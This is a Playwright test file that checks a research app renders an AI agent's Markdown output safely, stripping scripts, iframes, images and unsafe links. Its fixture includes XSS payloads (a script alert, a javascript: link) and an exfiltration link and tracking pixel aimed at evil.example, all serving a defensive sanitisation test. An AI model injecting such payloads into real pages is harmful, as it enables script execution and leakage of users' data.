import AxeBuilder from "@axe-core/playwright";

import { expect, test } from "./fixtures";

test("[pw.literature-run] renders structured agent Markdown without executable or exfiltration sinks", async ({
  page,
}) => {
  const content = [
    "## Findings",
    "",
    "- Evidence is bounded.",
    "- Unsupported links remain blocked.",
    "",
    "| Measure | Value |",
    "| --- | --- |",
    "| Coverage | 100% |",
    "",
    "<script>alert('xss')</script>",
    "<iframe src='https://evil.example'></iframe>",
    "[Run code](javascript:alert('xss'))",
    "[Exfiltrate](https://evil.example/collect?secret=1)",
    "![Tracker](https://evil.example/pixel.gif)",
    "[Verified source](https://evidence.example/source-1)",
    "",
    "```python",
    "x".repeat(20_100),
    "```",
  ].join("\n");
  await page.route(
    "**/api/backend/api/studios/literature/run",
    async (route) => {
      await route.fulfill({
        contentType: "application/json",
        body: JSON.stringify({
          run: {
            id: "run-markdown-security",
            durable_instance_id: "research-run-markdown-security",
            capability: "literature",
            title: "Markdown security fixture",
            status: "completed",
            current_stage: "Audit claims",
            progress: 100,
            started_at: "2026-07-22T12:00:00Z",
            owner: "Playwright",
          },
          protocol: {
            research_question: "Test untrusted Markdown",
            date_from: 2020,
            date_to: 2026,
            sources: ["PubMed"],
            inclusion_criteria: ["Primary study"],
            exclusion_criteria: ["No evidence"],
          },
          search_queries: ["Test untrusted Markdown"],
          candidate_count: 0,
          screening: [],
          extraction_matrix: [],
          synthesis: ["Only stored evidence can be verified."],
          citations: [
            {
              id: "citation-1",
              source_id: "source-1",
              chunk_id: "chunk-1",
              title: "Verified source",
              canonical_url: "https://evidence.example/source-1",
              identifier: "doi:10.0000/example",
              page_start: 4,
              page_end: 5,
              section: "Methods",
              quote: "The verified passage.",
              checksum: "sha256:test",
              license: "CC BY 4.0",
              retrieved_at: "2026-07-22T12:00:00Z",
            },
          ],
          insight: {
            agent_name: "literature-agent",
            content,
            evidence_state: "model_analysis",
            referenced_source_ids: ["source-1"],
            unresolved_source_ids: ["invented-source"],
            online_research_used: false,
          },
        }),
      });
    },
  );

  await page.goto("/");
  await expect(page.locator(".workbench-shell")).toHaveAttribute(
    "data-workspace-ready",
    "true",
  );
  await page
    .getByRole("button", { name: /literature review synthesis/i })
    .click();
  await page.getByRole("button", { name: "Search & screen evidence" }).click();

  const markdown = page.getByRole("region", { name: "Hosted Agent analysis" });
  await expect(
    markdown.getByRole("heading", { name: "Findings" }),
  ).toBeVisible();
  await expect(markdown.getByRole("table")).toBeVisible();
  await expect(markdown.locator("script, iframe, img")).toHaveCount(0);
  await expect(
    markdown.getByRole("link", { name: /Run code|Exfiltrate/ }),
  ).toHaveCount(0);
  await expect(
    markdown.getByRole("link", { name: /Verified source/ }),
  ).toHaveCount(1);
  await expect(markdown.getByText("[code block truncated]")).toBeVisible();
  await expect(markdown.getByText("invented-source")).toBeVisible();

  const accessibility = await new AxeBuilder({ page })
    .include(".research-markdown")
    .withTags(["wcag2a", "wcag2aa", "wcag21a", "wcag21aa"])
    .analyze();
  expect(accessibility.violations).toEqual([]);
});
